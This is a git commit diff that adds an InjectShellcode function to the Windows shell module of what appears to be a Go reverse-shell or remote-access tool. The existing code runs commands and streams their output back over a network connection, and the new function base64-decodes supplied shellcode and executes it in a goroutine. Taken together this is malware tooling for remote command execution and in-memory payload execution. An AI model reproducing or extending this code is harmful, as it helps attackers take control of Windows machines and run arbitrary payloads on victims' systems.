e16ca773e584e9c0a29de2b402cf29d358bd88db
krishpranav <krisna.pranav@gmail.com>
2021-05-25 18:46:18 +0530

    [+] Inject shell code functions [+]

--- shell/shell_windows.go
+++ shell/shell_windows.go
@@ -1,6 +1,7 @@
 package shell
 
 import (
+	"encoding/base64"
 	"net"
 	"os/exec"
 	"syscall"
@@ -25,4 +26,12 @@ func ExecuteCmd(command string, conn net.Conn) {
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Run()
+}
+
+func InjectShellcode(encShellcode string) {
+	if encShellcode != "" {
+		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
+			go ExecShellcode(shellcode)
+		}
+	}
 }
